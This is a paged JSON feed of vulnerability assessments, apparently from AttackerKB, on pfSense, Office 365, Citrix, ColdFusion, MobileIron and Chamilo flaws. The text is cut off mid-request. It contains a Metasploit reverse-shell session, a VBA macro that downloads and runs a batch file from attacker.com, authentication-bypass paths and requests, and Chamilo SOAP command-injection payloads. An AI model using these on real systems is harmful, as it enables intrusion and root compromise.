{
  "links": {
    "next": {
      "href": "/v1/assessments?expand=tags&page=16&size=100&sort=created%3Aasc"
    },
    "prev": {
      "href": "/v1/assessments?expand=tags&page=14&size=100&sort=created%3Aasc"
    },
    "self": {
      "href": "/v1/assessments?expand=tags&page=15&size=100&sort=created%3Aasc"
    }
  },
  "data": [
    {
      "id": "447b789d-66cc-4b42-afaf-2273454d94ee",
      "editorId": "de2686f1-1a8a-4518-8379-12188d859523",
      "topicId": "90034a13-2213-48d3-8019-c2643c2e76ec",
      "created": "2023-07-12T20:02:09.505259Z",
      "revisionDate": "2023-07-19T08:48:46.920957Z",
      "document": "On March 17th, 2023 it was announced that pfSense firewalls versions `2.6.0` and below were vulnerable to an authenticated remote code execution vulnerability resulting in code execution in the context of the root user.\r\n\r\nAuthenticated users, from the `/diag_backup.php` endpoint, are able open and restore a backup pfSense configuration XML file:\r\n\r\n![Screenshot 2023-07-12 at 3 29 18 PM](https://github.com/rapid7/metasploit-framework/assets/23320005/9c64f50c-2754-4fc5-9d32-6217cb02327d)\r\n\r\nThe name of the configuration XML file is user configurable. In vulnerable versions the filename does not get sanitized properly before being used in an `exec()` command in the `restore_rrddata` function inside the file: `/etc/inc/config.lib.inc`.  \r\n\r\nThe vulnerable `exec()` call can be seen below on line `288` which is an excerpt from the vulnerable version `2.6.0`[source code](https://redmine.pfsense.org/projects/pfsense/repository/2/entry/src/etc/inc/config.lib.inc?utf8=%E2%9C%93&rev=RELENG_2_6_0).\r\n\r\n![Screenshot 2023-07-12 at 3 19 11 PM](https://github.com/rapid7/metasploit-framework/assets/23320005/23ccf3b2-ce52-4c0b-9133-b9c26044ba19)\r\n\r\nThe following `escapeshellarg` patch has been applied:\r\n\r\n`exec(\"{$rrdtool} restore -f \" . escapeshellarg($xml_file) . ' ' . escapeshellarg($rrd_file), $output, $status);`\r\n\r\n# Attacker Value and Exploitation\r\nAs this requires authentication the attacker value isn\u2019t super high although it could come in handy for a malicious actor as it provides root level access on pfSense - the \u201dWorld's Most Trusted Open Source Firewall\u201d. Exploitation is super straightforward once credentials are obtained.\r\n\r\n# Metasploit \r\nExploiting this vulnerability using metasploit is as easy as one-two-three (or \u201cset rhosts\u201d, \u201cset lhost\u201d, \u201crun\u201d)\r\n```\r\nmsf6 > use unix/http/pfsense_config_data_exec\r\n[*] No payload configured, defaulting to cmd/unix/reverse_netcat\r\nmsf6 exploit(unix/http/pfsense_config_data_exec) > set rhosts 172.16.199.190\r\nrhosts => 172.16.199.190\r\nmsf6 exploit(unix/http/pfsense_config_data_exec) > set lhost 172.16.199.1\r\nlhost => 172.16.199.1\r\nmsf6 exploit(unix/http/pfsense_config_data_exec) > run\r\n\r\n[*] Started reverse TCP handler on 172.16.199.1:4444\r\n[*] Running automatic check (\"set AutoCheck false\" to disable)\r\n[+] The target appears to be vulnerable. The target appears to be running pfSense version 2.5.1-RELEASE, which is unpatched!\r\n[*] Command shell session 7 opened (172.16.199.1:4444 -> 172.16.199.191:55669) at 2023-07-12 14:48:15 -0400\r\n\r\nid\r\nuid=0(root) gid=0(wheel) groups=0(wheel)\r\nuname -a\r\nFreeBSD pfSense.home.arpa 12.2-STABLE FreeBSD 12.2-STABLE 1b709158e581(RELENG_2_5_0) pfSense  amd64\r\n```\r\n\r\n# Mitigation \r\nUpdate `pfSense` to version 2.7.0 or higher. \r\n\r\n\r\n\r\n",
      "score": 2,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 2,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "48d83770-a5bb-4f8d-8988-09a1b5f64e08",
      "editorId": "198da8db-21b5-4678-a70d-51ae5c950847",
      "topicId": "fb895e86-d9ce-4c01-a787-16cbdf994a9c",
      "created": "2023-07-19T07:28:09.916484Z",
      "revisionDate": "2023-07-19T08:48:11.285775Z",
      "document": "## [CVE-2023-33148](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-33148)\r\n\r\n## [Vendor](https://www.microsoft.com/en-us/microsoft-365/microsoft-office)\r\n\r\n![](https://raw.githubusercontent.com/nu11secur1ty/Windows11Exploits/main/2023/CVE-2023-33148/docs/Screenshot%202023-07-18%20133123.png)\r\n\r\n## Description:\r\nThe Microsoft Office 365 Version 18.2305.1222.0 app is vulnerable to Elevation of Privilege.\r\nThe attacker can use this vulnerability to attach a very malicious WORD file in the Outlook app which is a part of Microsoft Office 365 and easily can trick the victim to click on it - opening it and executing a very dangerous shell command, in the background of the local PC. This execution is without downloading this malicious file, and this is a potential problem and a very dangerous case! This can be the end of the victim's PC, it depends on the scenario.\r\nWARNING! Office 365 executes files directly from Outlook, without temp downloading, security checking and etc. \r\n\r\n\r\n## Staus: HIGH Vulnerability\r\n\r\n[+]Exploit:\r\n\r\n- - - NOTE:\r\nThis exploit is connected to the third-party server, and when the victim clicks on it and opens it the content of the script which is inside will fetch on the machine locally and execute himself by using MS Office 365 and Outlook app which is a part of the 365 API.\r\n\r\n```vb\r\nSub AutoOpen()\r\n  Call Shell(\"cmd.exe /S /c\" & \"curl -s https://attacker.com/uqev/namaikitiputkata/golemui.bat > salaries.bat && .\\salaries.bat\", vbNormalFocus)\r\nEnd Sub\r\n\r\n```\r\n\r\n## Reproduce:\r\n[href](https://github.com/nu11secur1ty/Windows11Exploits/tree/main/2023/CVE-2023-33148)\r\n\r\n## Proof and Exploit\r\n[href](https://www.nu11secur1ty.com/2023/07/cve-2023-33148.html)\r\n\r\n## Time spend:\r\n00:35:00",
      "score": 0,
      "metadata": {
        "mitre-tactics": "Privilege Escalation",
        "attacker-value": 4,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "73b27c15-2821-44d6-83bf-7d037fbbad07",
      "editorId": "dadd7295-ffae-449d-ba22-0a6feefa6f67",
      "topicId": "14ebb4a0-f165-41b2-9b60-4352c38c4f84",
      "created": "2023-07-19T21:42:03.122286Z",
      "revisionDate": "2023-08-07T09:47:12.944659Z",
      "document": "Note that the analysis before is for a separate issue - either a silently-patched vuln or some cleanup. We've posted a Rapid7 Analysis with the full details, so check that out!\r\n\r\n---\r\n\r\nI spent some time this week looking at [the advisory](https://support.citrix.com/article/CTX561482) for CVE-2023-3519, and the associated patch ([our blog post](https://www.rapid7.com/blog/post/2023/07/18/etr-critical-zero-day-vulnerability-in-citrix-netscaler-adc-and-netscaler-gateway/)). To test, I installed versions 13.0-91.12 and 13.0-91.13, and did a bunch of diffing / patch analysis to try and understand the vulnerability (I chose a 13.0 version with the idea that there will be less active maintenance, and therefore less other changes to the codebase). Ultimately I hit a paywall in the trial version, so I figured I'd post what I have and move onto something else.\r\n\r\nIf I'm right, the issue appears to be memory corruption in the SAML parser, in the `nsppe` process. Since `nsppe` runs as root, successful exploitation would likely lead to code execution as root (it would require network access to the management port).\r\n\r\nThis has been added [to the known exploited vulnerabilities list](https://www.cisa.gov/known-exploited-vulnerabilities-catalog), but they identify it as a \"code injection\" attack, so it's possible that this isn't right.\r\n\r\nAfter installing, I diffed everything on the filesystem to look for major changes. There were no obvious changes in the scripting stuff (PHP/Perl/etc), which is where I kinda expected to see the patch. Next, I diffed the binaries under `/netscaler` and other folders using this neat little Bash command:\r\n\r\n```\r\n$ for i in $(cat binaries.txt); do diff -rub <(strings -n8 ./13.0-91.12/$i | sort) <(strings -n8 ./13.0-91.13/$i | sort); done\r\n```\r\n\r\nThat command takes a list of binaries from the file `binaries.txt` (which I generated with `find -type f`), runs `strings` on both versions, then diffs the strings list. It's a nice quick way to quickly find or/ triage the files that are most interesting, though it won't find subtle logic changes.\r\n\r\nMost of the changes are just version numbers or other simple things that we can immediately discount. But one file, `nsppe`, had interesting looking changes, such as new error messages about a length value:\r\n\r\n```diff\r\n aaa_rpc_auth_fail_free_aaa_info\r\n aaa_rpc_auth_rejected\r\n+AAA SAMLIDP ASSERTION REQUEST: List of Canonicalization Method exceeds max limit <%d>, current value <%d>\r\n+AAA SAMLIDP ASSERTION REQUEST: List of Transforms Method exceeds max limit <%d>, current value <%d>\r\n aaa_samlidp_tot_authnreq_fail\r\n aaa_samlidp_tot_authnreq_succ\r\n```\r\n\r\nI grabbed the old and new versions of the `nsppe` binary, which it turns out is the NetScaler Packet Parsing Engine, and disassembled them. The binary is a beast, but we found some documentation [online](https://blog.myvirtualvision.com/2013/12/24/netscaler-policy-packet-engine/#:~:text=Frequently%20Asked%20Questions-,Packet%20Processing%20Engine,-The%20packet%20engine) that explains its purpose.\r\n\r\nThankfully, the changes made by this patch are limited. In case you want to make sure we're on the same page, here are the sha256es of the two versions I tested:\r\n\r\n```\r\n$ sha256 nsppe-13.0-91.12\r\nSHA256 (nsppe-13.0-91.12) = 9d1b39e59374088f355a9b26a1b9bb94addfb1dcd7af7fd28acd853403b414f7\r\n\r\n$ sha256 nsppe-13.0-91.13\r\nSHA256 (nsppe-13.0-91.13) = 3779d1148df674e3f107b384f1e770e658128a6d603399c3d595c31a0d37af4e\r\n```\r\n\r\nI diffed the patches using a complicated series of `sed` statements and the `diff` CLI tool to determine where the majority of the changes are. For the most part, the patch adds eight different length checks, each of which compares a local variable to 9, then prints an error message if it's larger. I put together this list of functions, along with the address where a check was added and the error message if the check fails (these are from the 91.13 version of `/netscaler/nsppe`):\r\n\r\n* Function: `ns_aaa_saml_parse_authn_request()`:\r\n    * 0xCA920B - `AAA SAMLIDP ASSERTION REQUEST: List of Canonicalization Method exceeds max limit <%d>, current value <%d>`\r\n    * 0xCAA57E - `AAA SAMLIDP ASSERTION REQUEST: List of Transforms Method exceeds max limit <%d>, current value <%d>`\r\n* Function `ns_aaa_saml_parse_logout_response()`:\r\n    * 0xCB09A6 - `AAA SAML LOGOUT RESPONSE: List of Canonicalization Method exceeds  max limit <%d>, current value <%d>`\r\n    * 0xCB1E29 - `AAA SAML LOGOUT RESPONSE: List of Transforms Method exceeds max limit <%d>, current value <%d>`\r\n* Function `ns_aaa_saml_parse_logout_request()`:\r\n    * 0xCB8154 - `AAA SAML LOGOUT REQUEST: List of Canonicalization Method exceeds max limit <%d>, current value <%d>`\r\n    * 0xCB94DB - `AAA SAML LOGOUT REQUEST: List of Transforms Method exceeds max limit <%d>, current value <%d>`\r\n* Function `ns_aaa_saml_parse_assertion()`:\r\n    * 0xD038E7 - `AAA SAMLSP ASSERTION RESPONSE: List of Canonicalization Method exceeds max limit <%d>, current value <%d>`\r\n    * 0xD04CD3 - `AAA SAMLSP ASSERTION RESPONSE: List of Transforms Method exceeds max limit <%d>, current value <%d>`\r\n\r\nAs you can see, the error messages are very similar, and strongly point to a length check being added.  Based on the error messages, I would _speculate_ that the vulnerability is triggered by sending too many canonicalization or transform methods in a SAML message. I randomly picked one of those errors (the Canonicalization Method check from `ns_aaa_saml_parse_authn_request`), and looked at how the newly-validated value is used. The `number_of_canonicalizations` value checked at 0xCA920B (in 91.13 - the patched version) is used to write into an array that I called `array_indexed_into`:\r\n\r\n```\r\n.text:0000000000CA9AAB loc_CA9AAB:                             ; CODE XREF: ns_aaa_saml_parse_authn_request+5C68\u2191j\r\n.text:0000000000CA9AAB                                         ; ns_aaa_saml_parse_authn_request+5C7D\u2191j\r\n.text:0000000000CA9AAB                 mov     eax, [rbp+number_of_canonicalizations]\r\n.text:0000000000CA9AAE                 mov     rdx, [rbp+array_indexed_into]\r\n.text:0000000000CA9AB5                 mov     dword ptr [rdx+rax*4+40h], 2\r\n.text:0000000000CA9ABD                 jmp     short loc_CA9AD0\r\n```\r\n\r\nTracing the targeted array backwards across several function calls leads to:\r\n\r\n```\r\n.text:00000000008128E9                 mov     edx, 35h ; '5'\r\n.text:00000000008128EE                 mov     esi, 210h\r\n.text:00000000008128F3                 mov     edi, offset ns_alloc_memz\r\n.text:00000000008128F8                 call    ns_meminst_alloc\r\n```\r\n\r\n`ns_meminst_alloc` and `ns_alloc_memz` are memory-allocation functions, and it looks like heap memory, though I'm not 100% sure on that one.\r\n\r\nSo anyway, my _guess_ is that the core of this vulnerability is a probably-heap overflow when parsing certain types of SAML requests with too many canonicalization or transform methods.\r\n\r\nI tried to verify that, but I believe the AAA features are behind a paywall (licensewall?), so I can't access them:\r\n\r\n```\r\n> enable ns feature AAA\r\nERROR: Feature(s) not licensed\r\n```\r\n\r\nRather than fuss with licensing, I figured I'd post what I have and carry on!",
      "score": 6,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 1
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "33d6ce30-f73d-43a9-9479-fac8d9ad9892",
      "editorId": "d603b493-1c7b-4ee8-972f-185269cce6d3",
      "topicId": "cc339c3d-417d-4477-92a7-746aea51530c",
      "created": "2023-07-20T16:06:02.468427Z",
      "revisionDate": "2023-07-20T16:06:02.467454Z",
      "document": "As per the [Rapid7 advisory](https://www.rapid7.com/blog/post/2023/07/11/cve-2023-29298-adobe-coldfusion-access-control-bypass/), this vulnerability allows an attacker to bypass an access control feature designed to permit access to the ColdFusion Administrator endpoints on a ColdFusion web server based on the requesting IP address. When a request originates from an external IP address that is not present in the access controls allow list, access to the requested resource is blocked. At attacker can construct a URL whose path contains an unexpected forward slash, such as `//CFIDE/wizards/common/utils.cfc` and the resource can be accessed regardless of the requests IP address.\r\n\r\nThis vulnerability is particularly useful to an attacker as it can be chained with existing RCE vulnerabilities that require targeting CFC of CFRM endpoints ion the ColdFusion administrator, such as [CVE-2023-26360](https://attackerkb.com/topics/F36ClHTTIQ/cve-2023-26360) or [CVE-2023-38203](https://attackerkb.com/topics/61J8cvFAkt/cve-2023-38203).",
      "score": 1,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "28855871-02af-4a5f-aaa7-7d4ae0e81157",
      "editorId": "d603b493-1c7b-4ee8-972f-185269cce6d3",
      "topicId": "3155c4ce-7cb2-4dd1-8f75-10ebe7fe285e",
      "created": "2023-07-20T16:11:21.962673Z",
      "revisionDate": "2023-07-20T16:11:21.961853Z",
      "document": "As per the [Rapid7 advisory](https://www.rapid7.com/blog/post/2023/07/19/cve-2023-38205-adobe-coldfusion-access-control-bypass-fixed/), an access control bypass vulnerability previously patched by Adobe, [CVE-2023-29298](https://attackerkb.com/topics/6LnuhTdLBy/cve-2023-29298), was incomplete and an attacker could still bypass the access control by specifying a URL with an unexpected double dot sequence, such as `/hax/..CFIDE/wizards/common/utils.cfc`. The new patch bypass vulnerability was designated CVE-2023-38205.",
      "score": 1,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "b87caa7e-48f2-44ed-b9bd-4092d73a9070",
      "editorId": "38346220-4c55-4428-af6f-466a697194f3",
      "topicId": "5115fdda-c45c-48b5-b86e-1e7cf1393439",
      "created": "2023-07-28T09:10:37.624248Z",
      "revisionDate": "2023-07-28T09:10:37.623978Z",
      "document": "The XXE is in a function (`Xml::parse`) that is part of the core library but is not used directly in the CMS. So to be vulnerable, one has to have made a custom page or installed an extension using this vulnerable function.\r\nElse it's pretty handy and is present in nearly all versions of the CMS until the patch.",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "795f5056-8a39-4610-912c-c033bd6fd4cb",
          "name": "Vulnerable in uncommon configuration",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "obscure_configuration"
        }
      ]
    },
    {
      "id": "425fe319-1115-4c48-b5fc-33f2d3e9187a",
      "editorId": "d603b493-1c7b-4ee8-972f-185269cce6d3",
      "topicId": "ef433fc6-08db-45b7-a9e8-8cc1e4d8b89a",
      "created": "2023-07-28T18:43:40.297934Z",
      "revisionDate": "2023-07-28T18:43:40.296365Z",
      "document": "## Analysis\r\nWe analyzed an older unsupported version of MobileIron Core version 11.2.0.0-31 which is vulnerable to CVE-2023-35078. The vulnerability allows for remote unauthenticated API access due to an access control bypass vulnerability. \r\n\r\nThe server leverages an Apache reverse proxy to forward requests to a Tomcat server running a Java web application which is built on top of the Spring framework. For an incoming API request, Apache will pass-through requests for `/api/v2/` to `/mifs/rs/api/v2/` in the \u201cMI File Service\u201d (mifs) web application:\r\n\r\n```\r\n  RewriteRule         ^/api/v2/(.*)$                      /mifs/rs/api/v2/$1                [PT]\r\n```\r\n\r\nThe mifs web application has the following in its `security.xml` configuration file:\r\n\r\n```xml\r\n  <sec:http pattern=\"/aad/**\" security=\"none\" create-session=\"stateless\"/>\r\n\r\n  <!-- ...snip... -->\r\n\r\n  <!-- For web service API -->\r\n  <sec:http pattern=\"/rs/api/v2/**\" create-session=\"stateless\" use-expressions=\"false\" disable-url-rewriting=\"false\">\r\n    <sec:http-basic/>\r\n    <sec:csrf disabled=\"true\"/>\r\n  </sec:http>\r\n```\r\n\r\nThis enforces HTTP Basic authentication on API requests. We can note that requests to the url pattern `\"/aad/**\"` are set to `security=\"none\"`, which disables the security filter chain for the request, if the request is handled. As this appears before the security filter for the API paths, it appears a subtle vulnerability is then introduced by how the Azure Active Directory (`aaddispatcher`) servlet handles requests. The web application's `web.xml` file contains a servlet mapping that will process all requests that match the URL pattern `\"/aad/*\"` (which will be `\"/mifs/aad/*\"` before it is passed to the Tomcat server):\r\n\r\n```xml\r\n  <servlet>\r\n    <servlet-name>aaddispatcher</servlet-name>\r\n    <servlet-class>org.springframework.web.servlet.DispatcherServlet</servlet-class>\r\n    <init-param>\r\n      <param-name>contextConfigLocation</param-name>\r\n      <param-value>\r\n        WEB-INF/aadenrollment-servlet.xml\r\n      </param-value>\r\n    </init-param>\r\n    <load-on-startup>101</load-on-startup>\r\n  </servlet>\r\n\r\n  <servlet-mapping>\r\n    <servlet-name>aaddispatcher</servlet-name>\r\n    <url-pattern>/aad/*</url-pattern>\r\n  </servlet-mapping>\r\n```\r\n\r\nIf an attacker sends a request to an API endpoint such as `/mifs/aad/api/v2/ping`, then the API can be called successfully without authentication.\r\n\r\nIt appears that the `aaddispatcher` servlet processes the request, which disables the security filter chain from processing any more filters and no authentication is performed. For reasons currently unknown, the request is then serviced by the servlet that handles API requests (`CXFServlet`).\r\n\r\nFor example, if an attacker attempts to access the endpoint `/api/v2/ping` unauthenticated, the request fails with a 401 unauthorized response.\r\n\r\n```\r\nC:\\>curl -k https://192.168.86.103/api/v2/ping\r\n{\"messages\":[{\"type\":\"Error\",\"messageKey\":\"com.mobileiron.vsp.messages.http.401\",\"localizedMessage\":\"Unauthorized\"}]}\r\n```\r\n\r\nHowever if an attacker attempts to access the endpoint `/mifs/aad/api/v2/ping` the request succeeds.\r\n\r\n```\r\nC:\\>curl -k https://192.168.86.103/mifs/aad/api/v2/ping\r\n{\"results\":{\"apiVersion\":2.0,\"vspVersion\":\"VSP 11.2.0.0 Build 31 \"}}\r\n```\r\n## Indicators of Compromise \r\nThe following indicators of compromise are present in the Apache HTTP logs stored on the appliance.\r\n\r\nThe log file `/var/log/httpd/https-access_log` will have an entry showing a request to a targeted API endpoint, containing `/mifs/aad/api/v2/` in the path and showing a HTTP response code of 200. Blocked exploitation attempts will show a HTTP response code of either 401 or 403. For example:\r\n\r\n```\r\n192.168.86.34:58482 - - 2023-07-27--13-01-39 \"GET /mifs/aad/api/v2/ping HTTP/1.1\" 200 68 \"-\" \"curl/8.0.1\" 2509\r\n```\r\n## Remediation\r\nIvanti has released the following patches to address the issue:\r\n\r\n* 11.10.0.2\r\n* 11.9.1.1\r\n* 11.8.1.1\r\n\r\nProduct versions no longer receiving support are also affected, and Ivanti has released a workaround as part of their response.",
      "score": 1,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "ac7d36f8-513a-432d-bde3-26f776a303af",
      "editorId": "8a465efa-5959-4307-868a-5c6bd2f9fdc9",
      "topicId": "e396119b-020d-43b0-8040-4fe5b5cf8309",
      "created": "2023-07-28T20:11:32.533166Z",
      "revisionDate": "2023-08-16T13:17:31.107184Z",
      "document": "`Chamilo` is a free software (under GNU/GPL licensing) e-learning and content management system, aimed at improving access to education and knowledge globally. It has been used by more than 30M people worldwide since its inception in 2010.\r\nThe following `Shodan` dork: `http.component:\"Chamilo\"` will give you the list of `Chamilo` installations running in the wild.\r\n\r\n`Chamilo` versions `1.11.18` and below suffers from an unauthenticated remote command execution vulnerability. Due to a functionality called `Chamilo Rapid` to easily convert PowerPoint slides to courses on `Chamilo`, it is possible for an unauthenticated remote attacker to execute arbitrary commands at OS level using a malicious SOAP request at the vulnerable endpoint `/main/webservices/additional_webservices.php`.\r\n\r\nIt is a classical example of OS command injection (also known as shell injection) that allows an attacker to execute an arbitrary operating system (OS) commands on the server that is running an application, and typically fully compromise the application and all its data.\r\n\r\nIn the vulnerable file `/main/webservices/additional_webservices.php` the function `wsConvertPpt` that can be used to convert a PowerPoint file to courses on `Chamilo` using a shell command  . To use this feature, a SOAP request needs to be performed containing an URL pointing to the PowerPoint file.\r\nIn code excerpt below, you can easily identify the command line where the `filename` is not properly filtered by the function, hence making it vulnerable to command injection when it is called by the `exec()` function. \r\n\r\n```php\r\nfunction wsConvertPpt($pptData)\r\n{\r\n    global $_configuration;\r\n    $ip = trim($_SERVER['REMOTE_ADDR']);\r\n    // If an IP filter array is defined in configuration.php,\r\n    // check if this IP is allowed\r\n    if (!empty($_configuration['ppt2lp_ip_filter'])) {\r\n        if (!in_array($ip, $_configuration['ppt2lp_ip_filter'])) {\r\n            return false;\r\n        }\r\n    }\r\n    $fileData = $pptData['file_data'];\r\n    $dataInfo = pathinfo($pptData['file_name']);\r\n    $fileName = basename($pptData['file_name'], '.'.$dataInfo['extension']);\r\n    $fullFileName = $pptData['file_name'];\r\n    $size = $pptData['service_ppt2lp_size'];\r\n    $w = '800';\r\n    $h = '600';\r\n    if (!empty($size)) {\r\n        list($w, $h) = explode('x', $size);\r\n    }\r\n\r\n    $tempArchivePath = api_get_path(SYS_ARCHIVE_PATH);\r\n    $tempPath = $tempArchivePath.'wsConvert/'.$fileName.'/';\r\n    $tempPathNewFiles = $tempArchivePath.'wsConvert/'.$fileName.'-n/';\r\n\r\n    $oldumask = umask(0);\r\n    //$perms = api_get_permissions_for_new_directories();\r\n    // Set permissions the most permissively possible: these files will\r\n    // be deleted below and we need a parallel process to be able to write them\r\n    $perms = api_get_permissions_for_new_directories();\r\n    pptConverterDirectoriesCreate($tempPath, $tempPathNewFiles, $fileName, $perms);\r\n\r\n    $file = base64_decode($fileData);\r\n    file_put_contents($tempPath.$fullFileName, $file);\r\n\r\n    $cmd = pptConverterGetCommandBaseParams();\r\n\r\n/* VULNERABLE CODE */\r\n    $cmd .= ' -w '.$w.' -h '.$h.' -d oogie \"'.$tempPath.$fullFileName.'\"  \"'.$tempPathNewFiles.$fileName.'.html\"';\r\n\r\n    //$perms = api_get_permissions_for_new_files();\r\n    chmod($tempPathNewFiles.$fileName, $perms);\r\n\r\n    $files = [];\r\n    $return = 0;\r\n\r\n/* EXEC FUNCTION */\r\n    $shell = exec($cmd, $files, $return);\r\n\r\n    umask($oldumask);\r\n```\r\nBy using the SOAP request below, you can trigger the command injection replacing `YOUR COMMAND` with any Unix OS command.\r\n```xml\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ns1=\"http://localhost:80/\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:ns2=\"http://xml.apache.org/xml-soap\" xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\r\n  <SOAP-ENV:Body>\r\n    <ns1:wsConvertPpt>\r\n     <param0 xsi:type=\"ns2:Map\">\r\n      <item>\r\n       <key xsi:type=\"xsd:string\">file_data</key>\r\n       <value xsi:type=\"xsd:string\"></value>\r\n      </item>\r\n      <item>\r\n        <key xsi:type=\"xsd:string\">file_name</key>\r\n        <value xsi:type=\"xsd:string\">`YOUR COMMAND`.pptx</value>\r\n       </item>\r\n       <item>\r\n        <key xsi:type=\"xsd:string\">service_ppt2lp_size</key>\r\n        <value xsi:type=\"xsd:string\">720x540</value>\r\n       </item>\r\n    </param0>\r\n   </ns1:wsConvertPpt>\r\n  </SOAP-ENV:Body>\r\n</SOAP-ENV:Envelope>\r\n```\r\nI did several tests on a Ubuntu 22.04 server with `Chamilo 1.11.18` installed to see which command injections do work and I found three variants so far. Two blind command injections and one command injection that is not blind.\r\n\r\n**Blind variants:**\r\n- ```<value xsi:type=\"xsd:string\">`command`.pptx</value>```\r\n- ```<value xsi:type=\"xsd:string\">|\" |command||a #`.pptx'</value>```\r\n\r\n**Non blind variant:**\r\n- ```<value xsi:type=\"xsd:string\">`{{}}`.pptx'|\" |command||a #</value>```\r\n\r\nLet's quick demonstrate the non-blind command injection variant with `burpsuite` on a vulnerable `Chamilo` installation.\r\n\r\n**Burp request**\r\n```html\r\nPOST /chamilo/main/webservices/additional_webservices.php HTTP/1.1\r\nHost: 192.168.201.47\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\r\nContent-Type: text/xml; charset=utf-8\r\nContent-Length: 1031\r\nConnection: close\r\n\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<SOAP-ENV:Envelope\r\n  xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\"\r\n  